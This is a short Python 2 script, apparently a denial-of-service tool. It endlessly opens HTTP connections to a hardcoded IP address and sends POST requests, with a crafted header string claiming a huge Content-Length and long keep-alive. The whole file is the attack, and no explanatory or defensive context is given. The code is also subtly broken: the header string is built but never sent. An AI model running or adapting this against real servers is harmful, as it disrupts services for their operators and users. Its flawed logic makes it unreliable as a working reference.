#!/usr/bin/env python
#coder:Qiaoy<traceurq@gmail.com>
#date:2013.04.13

import httplib
import time

hosts = '10.121.21.35'	#Ip adder
port = '80'				#web port


while 1:
	value ="Connection: keep-alive\r\n"+\
			"Keep-Alive: 9999\r\n"+"Content-Length: 99999999999\r\n"+\
			"Content_Type: application/x-www-form-urlencoded\r\n"+\
			"Accept: *.*\r\n"
	conn = httplib.HTTPConnection('%s:%s'%(hosts,port))
	conn.request('POST','/','value')
